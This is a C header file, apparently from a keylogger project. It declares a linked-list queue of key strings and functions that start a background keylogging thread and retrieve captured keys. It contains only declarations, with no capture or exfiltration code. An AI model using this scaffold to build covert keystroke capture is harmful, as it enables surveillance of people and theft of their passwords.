#ifndef _keylogger_h
#define _keylogger_h

typedef struct node node;
struct node{
    char key[20];
    node* next;
};

typedef struct{
    node* rear;
    node* front;
} queue;

queue* init_queue();
node* create_new_node(char* value);
int enqueue(queue* q, char* value);
node* dequeue(queue* q);
void keylog(queue* q);
void* keylogthread(void* args);
pthread_t start_keylog_thread(queue* q);
int get_keylog(queue* q, char* key);

#endif

